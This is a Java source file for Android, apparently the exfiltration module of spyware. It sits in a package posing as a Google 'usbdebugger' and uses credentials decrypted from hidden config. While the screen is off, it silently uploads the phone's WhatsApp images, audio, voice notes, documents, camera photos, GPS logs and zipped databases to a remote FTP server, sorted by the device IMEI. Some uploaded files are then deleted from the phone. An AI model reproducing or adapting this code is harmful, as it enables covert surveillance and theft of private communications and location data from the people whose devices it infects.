package com.google.android.usbdebugger;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.support.annotation.RequiresApi;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPFile;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.SocketException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

public class FTP_Sender {

    final static String V = "V", Db = "Db", DCIM = "DCIM", Whpp = "WhatsApp", WhppSent = "Sent",
            WhppNotes = "VoiceNotes", Configure = "Configure";
    private static ArrayList Params;

    public static String [] Netice = {"Finish","Finish","Finish","Finish","Finish","Finish","Finish"
                            ,"Finish","Finish","Finish","Finish","Finish","Finish","Finish","Finish"};

    public static boolean hasConnection(final Context context, final int net) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);

        NetworkInfo wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        if (wifiInfo != null && wifiInfo.isConnected()) {
            return true;
        }
        if(Params!=null) {
            if (Params.get(15).toString().equals("1") || net == 1) {
                wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
                if (wifiInfo != null && wifiInfo.isConnected()) {
                    return true; //3G,4G
                }

                wifiInfo = cm.getActiveNetworkInfo();
                return wifiInfo != null && wifiInfo.isConnected(); //WiFi
            }
        }
        return false;
    }

    public static  void FTP(final File path, final String[] Filess, final int type, final int base,
                    final int sent, final ArrayList Conf, final boolean screenstastus,
                    final String imeiNumber1, final Context context, final int recordCount, final File aDir) {

        new Thread(new Runnable() {

            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            public void run() {

                DBHelper dbh = new DBHelper(context);
                SQLiteDatabase db = dbh.getWritableDatabase();

                Params = Conf;

                if (hasConnection(context, 0)) {
                    if (!screenstastus) {
                        Date dt = new Date();
                        @SuppressLint("SimpleDateFormat")
                        SimpleDateFormat ft2 = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
                        String daa = ft2.format(dt);

                        FTPClient mFTP = new FTPClient();
                        try {
                            mFTP.connect(EncryptDecryptStringWithAES.decrypt(Conf.get(2).toString()), Integer.parseInt(Conf.get(3).toString()));
                            mFTP.login(EncryptDecryptStringWithAES.decrypt(Conf.get(5).toString()), EncryptDecryptStringWithAES.decrypt(Conf.get(6).toString()));
                            mFTP.setFileType(FTP.BINARY_FILE_TYPE);

                            mFTP.makeDirectory(Configure);
                            mFTP.makeDirectory(imeiNumber1);
                            mFTP.changeWorkingDirectory(imeiNumber1);
                            if (type == 10 && base == 1) {
                                mFTP.makeDirectory(Db);
                                mFTP.changeWorkingDirectory(Db);
                            }
                            if (type == 0) {
                                mFTP.changeToParentDirectory();
                                mFTP.changeWorkingDirectory(Configure);
                            }
                            if (type == 1) {
                                mFTP.makeDirectory(V);    //1
                            }
                            if (type == 2) {
                                mFTP.makeDirectory(DCIM); //2
                                mFTP.changeWorkingDirectory(DCIM);
                            }

                            if (type == 3) {
                                mFTP.makeDirectory(Whpp);
                                mFTP.changeWorkingDirectory(Whpp);
                                mFTP.makeDirectory("WhatsAppImages");
                                mFTP.changeWorkingDirectory("WhatsAppImages");
                                mFTP.makeDirectory(WhppSent);
                                mFTP.changeToParentDirectory();
                            }
                            if (type == 4) {
                                mFTP.makeDirectory(Whpp);
                                mFTP.changeWorkingDirectory(Whpp);
                                mFTP.makeDirectory("WhatsAppAudio");
                                mFTP.changeWorkingDirectory("WhatsAppAudio");
                                mFTP.makeDirectory(WhppSent);
                                mFTP.changeToParentDirectory();
                            }
                            if (type == 5) {
                                mFTP.makeDirectory(Whpp);
                                mFTP.changeWorkingDirectory(Whpp);
                                mFTP.makeDirectory(WhppNotes); // Notes
                            }
                            if (type == 6) {
                                mFTP.makeDirectory(Whpp);
                                mFTP.changeWorkingDirectory(Whpp);
                                mFTP.makeDirectory("WhatsAppDocument");
                                mFTP.changeWorkingDirectory("WhatsAppDocument");
                                mFTP.makeDirectory(WhppSent);
                                mFTP.changeToParentDirectory();
                            }
                            if (type == 7) {
                                mFTP.makeDirectory("GPS");
                                mFTP.changeWorkingDirectory("GPS");
                            }

                            mFTP.enterLocalPassiveMode();//.enterLocalPassiveMode();
                            InputStream inputStream;

                            if (type == 3 && sent == 0) {
                                mFTP.changeWorkingDirectory(Whpp);
                                mFTP.changeWorkingDirectory("WhatsAppImages");
                            }
                            if (type == 3 && sent == 1) {
                                mFTP.changeWorkingDirectory(Whpp);
                                mFTP.changeWorkingDirectory("WhatsAppImages");
                                mFTP.changeWorkingDirectory(WhppSent);
                            }
                            if (type == 4 && sent == 0) {
                                mFTP.changeWorkingDirectory(Whpp);
                                mFTP.changeWorkingDirectory("WhatsAppAudio");
                            }
                            if (type == 4 && sent == 1) {
                                mFTP.changeWorkingDirectory(Whpp);
                                mFTP.changeWorkingDirectory("WhatsAppAudio");
                                mFTP.changeWorkingDirectory(WhppSent);
                            }
                            if (type == 5 && sent == 0) {
                                mFTP.changeWorkingDirectory(Whpp);
                                mFTP.changeWorkingDirectory(WhppNotes);
                            }
                            if (type == 6 && sent == 0) {
                                mFTP.changeWorkingDirectory(Whpp);
                                mFTP.changeWorkingDirectory("WhatsAppDocument");
                            }
                            if (type == 6 && sent == 1) {
                                mFTP.changeWorkingDirectory(Whpp);
                                mFTP.changeWorkingDirectory("WhatsAppDocument");
                                mFTP.changeWorkingDirectory(WhppSent);
                            }

                            if (Filess != null && !Filess[0].equals("")) {
                                Netice[type] = "Start";
                                for (String filess : Filess) {
                                    inputStream = new FileInputStream(filess);
                                    File pp = new File(filess);

                                    if (type == 1 && base == 0) {
                                        mFTP.changeWorkingDirectory(V);
                                        String remoteFilePath = pp.getName();
                                        boolean success = mFTP.storeFile(remoteFilePath, inputStream);
                                        //ftpsuccess = success;
                                        if (success) {
                                            pp.delete();
                                            Netice[type] = "Send";
                                            if (!db.isOpen()) {
                                                db = dbh.getWritableDatabase();
                                            }
                                            dbh.Delete_MaxCount(db, "SrFiles", remoteFilePath, 0,
                                                    "1", aDir, recordCount);
                                        }
                                        inputStream.close();
                                    }

                                    if (type == 2 || type == 3 || type == 4 || type == 5 || type == 6) {

                                        String remoteFilePath = "";
                                        try {
                                            remoteFilePath = pp.getName();
                                            if (!db.isOpen()) {
                                                db = dbh.getWritableDatabase();
                                            }
                                            //if (!dbh.Select_Distinct(db, "SrFiles", " where CP = 1 and FN = '" + remoteFilePath + "'")) {
                                            boolean success = mFTP.storeFile(remoteFilePath, inputStream);
                                            if (success) {
                                                Netice[type] = "Send";
                                                if (!db.isOpen()) {
                                                    db = dbh.getWritableDatabase();
                                                }
                                                dbh.insert_SrFiles2(db, "SrFiles", remoteFilePath, daa,
                                                        String.valueOf(type), String.valueOf(sent), "1", "0");
                                                //dbh.Update(db, "SrFiles", " FN = '" + remoteFilePath + "' and DE = 0", 1, null);
                                            }
                                                    /*if(type!=2) {
                                                        mFTP.changeToParentDirectory();
                                                    }*/
                                            inputStream.close();
                                            //}
                                        } catch (Exception ex) {
                                            dbh.insert_Exeption(db, "FTP DCIMtype Whatsapptype", "Exception", ex.getMessage(), daa);
                                            inputStream.close();
                                        }
                                    }
                                }
                                Netice[type] = "Finish";
                            }
                            if (path != null) {
                                /*if (type == 0) {
                                    Netice[type] = "Start";
                                    String fn = path.getName();
                                    inputStream = new FileInputStream(path);
                                    boolean success = mFTP.storeFile(fn, inputStream);
                                    if (success) {
                                        path.delete();
                                        Netice[type] = "Send";
                                    }
                                    inputStream.close();
                                    Netice[type] = "Finish";
                                }*/

                                if (type == 7) {
                                    FTPFile[] ftpFiles = mFTP.listFiles();
                                    String fn = path.getName();
                                    if (ftpFiles != null) {
                                        Netice[type] = "Start";
                                        for (int i = 0; i < ftpFiles.length; i++) {
                                            if (ftpFiles[i].getName().equals(fn)) {
                                                if (fn.length() >= 4) {//13
                                                    fn = fn.substring(0, 4);//0,9
                                                    fn = fn + i;
                                                }
                                                i = 0;
                                            }
                                        }
                                    }
                                    inputStream = new FileInputStream(path);
                                    boolean success = mFTP.storeFile(fn, inputStream);
                                    if (success) {
                                        path.delete();
                                        Netice[type] = "Send";
                                    }
                                    inputStream.close();
                                    Netice[type] = "Finish";
                                }
                                if (type == 10 && base == 1) {
                                    //mFTP.changeWorkingDirectory(Db);
                                    File fpath1 = new File(context.getFilesDir().getPath() + "/" + imeiNumber1);
                                    FileUtil ff = new FileUtil();
                                    //db.close();
                                    if (ff.createZipArchive(path.getParent(), fpath1.getPath() + "/databases.zip")) {
                                        File fpath2 = new File(fpath1 + "/databases.zip");

                                        String fn = fpath2.getName();
                                        FTPFile[] ftpFiles = mFTP.listFiles();

                                        if (ftpFiles != null) {
                                            Netice[type] = "Start";
                                            for (int i = 0; i < ftpFiles.length; i++) {
                                                if (ftpFiles[i].getName().equals(fn)) {
                                                    if (fn.length() >= 13) {//13
                                                        fn = fn.substring(0, 9);//0,9
                                                        fn = fn + i + ".zip";
                                                    }
                                                    i = 0;
                                                }
                                            }
                                        }
                                        inputStream = new FileInputStream(fpath2);
                                        boolean success = mFTP.storeFile(fn, inputStream);
                                        if (success) {
                                            fpath2.delete();
                                            Netice[type] = "Send";
                                            if (!db.isOpen()) {
                                                db = dbh.getWritableDatabase();
                                            }
                                            dbh.delete(db, "SrFiles", " DE = 1 ");
                                        }
                                        inputStream.close();
                                        Netice[type] = "Finish";
                                    }
                                }
                            }
                            mFTP.logout();
                            mFTP.disconnect();
                        } catch (SocketException e) {
                            //Log.e("ERR1", "SocketException :"+e.getMessage());
                            dbh.insert_Exeption(db, "FTP(SocketException)", "SocketException", e.getMessage(), daa);
                        } catch (IOException e) {
                            //Log.e("ERR1", "IOException :"+e.getMessage());
                            dbh.insert_Exeption(db, "FTP(IOException)", "IOException", e.getMessage(), daa);
                        }
                    }
                } else {
                    if (type != 0) {
                        if (!db.isOpen()) {
                            db = dbh.getWritableDatabase();
                        }
                        dbh.Delete_MaxCount(db, "SrFiles", null, 1, "1", aDir, recordCount);
                    }
                }
            }
        }).start();
    }
}
